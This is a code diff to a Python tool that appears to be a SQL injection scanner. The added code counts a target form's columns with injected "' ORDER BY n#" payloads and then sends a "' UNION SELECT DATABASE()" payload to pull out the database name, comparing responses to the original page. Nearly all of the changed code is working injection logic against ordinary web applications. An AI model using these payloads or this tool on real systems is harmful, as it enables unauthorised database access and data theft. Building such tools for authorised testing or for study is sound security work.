@@ -31,7 +31,6 @@ def form_url(url, add):
 def print_diff(str1, str2):
 	differ = Differ()
 	diff = list(differ.compare(str1.splitlines(), str2.splitlines()))
-	print(diff)
 	diff_str = '\n'.join(diff)
 	print(diff_str)
 
@@ -41,15 +40,32 @@ class Union:
 		self.delimiter = "'"
 		self.header = self.delimiter + " UNION "
 		self.comment = "#"
+
 		self.original_text = self.submit("").text
 
+		self.colum_counts = self.check_num_colums()
+
 	def check_num_colums(self):
-		query = self.delimiter + q + self.comment
+		for i in range(1, 10):
+			q = f" ORDER BY {i}"
+			query = self.delimiter + q + self.comment
+			res = self.submit(query)
+			if not res.text.strip().startswith("<!DOCTYPE"):
+				break
+		colum_counts = i - 1
+		print(f"colum counts: {colum_counts}")
+		return colum_counts
+
+	def get_database_name(self):
+		colum_lst = ["DATABASE()"] * self.colum_counts
+		colums = ", ".join(colum_lst)
+		query = self.header + "SELECT " + colums + self.comment
+		print(query)
 		res = self.submit(query)
 		print_diff(self.original_text, res.text)
 
 	def union(self):
-		self.check_num_colums()
+		self.get_database_name()
 
 class Vaccine:
 	def __init__(self, url, file, method):
